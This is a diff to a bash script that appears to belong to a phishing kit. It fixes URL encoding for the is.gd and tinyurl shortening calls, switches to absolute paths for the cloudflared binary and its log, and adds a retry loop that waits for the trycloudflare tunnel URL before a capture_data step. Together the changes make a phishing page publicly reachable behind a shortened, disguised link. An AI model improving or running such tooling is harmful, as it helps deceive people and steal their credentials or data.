@@ -202,15 +202,18 @@ shorten_url() {
     long_url="$1"
     short_url=""
     
+    # URL encode the long_url
+    encoded_url=$(printf '%s' "$long_url" | sed 's/ /%20/g; s/!/%21/g; s/#/%23/g; s/\$/%24/g; s/&/%26/g; s/'"'"'/%27/g; s/(/%28/g; s/)/%29/g; s/\*/%2A/g; s/+/%2B/g; s/,/%2C/g; s/\//%2F/g; s/:/%3A/g; s/;/%3B/g; s/=/%3D/g; s/?/%3F/g; s/@/%40/g; s/\[/%5B/g; s/\]/%5D/g')
+    
     # Try is.gd first
     echo -ne "\n${GREEN}[+]${CYAN} Shortening URL...${WHITE}"
-    short=$(curl -s "https://is.gd/create.php?format=simple&url=${long_url}" 2>/dev/null)
+    short=$(curl -s "https://is.gd/create.php?format=simple&url=${encoded_url}" 2>/dev/null)
     
     if [[ "$short" == http* && "$short" != *"error"* ]]; then
         short_url="$short"
     else
         # Try tinyurl as backup
-        short=$(curl -s "https://tinyurl.com/api-create.php?url=${long_url}" 2>/dev/null)
+        short=$(curl -s "https://tinyurl.com/api-create.php?url=${encoded_url}" 2>/dev/null)
         if [[ "$short" == http* ]]; then
             short_url="$short"
         fi
@@ -251,7 +254,7 @@ custom_url() {
 }
 
 start_cloudflared() {
-    rm -f .server/.cld.log
+    rm -f "$BASE_DIR/.server/.cld.log"
     cusport
     echo -e "\n${RED}[-]${GREEN} Starting... (${CYAN}http://$HOST:$PORT${GREEN})${WHITE}"
     setup_site
@@ -259,18 +262,24 @@ start_cloudflared() {
     echo -ne "\n${RED}[-]${GREEN} Launching Cloudflared...${WHITE}"
 
     if command -v termux-chroot >/dev/null 2>&1; then
-        termux-chroot ./.server/cloudflared tunnel -url "$HOST:$PORT" --logfile .server/.cld.log >/dev/null 2>&1 &
+        termux-chroot "$BASE_DIR/.server/cloudflared" tunnel -url "$HOST:$PORT" --logfile "$BASE_DIR/.server/.cld.log" >/dev/null 2>&1 &
     else
-        ./.server/cloudflared tunnel -url "$HOST:$PORT" --logfile .server/.cld.log >/dev/null 2>&1 &
+        "$BASE_DIR/.server/cloudflared" tunnel -url "$HOST:$PORT" --logfile "$BASE_DIR/.server/.cld.log" >/dev/null 2>&1 &
     fi
 
-    sleep 8
-    cldflr_url=$(grep -o 'https://[0-9a-z]*\.trycloudflare.com' ".server/.cld.log" 2>/dev/null)
+    # Wait for tunnel with retry loop (max 30 seconds)
+    cldflr_url=""
+    for i in {1..15}; do
+        sleep 2
+        cldflr_url=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$BASE_DIR/.server/.cld.log" 2>/dev/null | head -n1)
+        [[ -n "$cldflr_url" ]] && break
+    done
 
     if [[ -n "$cldflr_url" ]]; then
         custom_url "$cldflr_url"
     else
         echo -e "\n${RED}[!] URL generation failed. Check hotspot.${WHITE}"
+        echo -e "${RED}[!] Log file: $BASE_DIR/.server/.cld.log${WHITE}"
     fi
     capture_data
 }
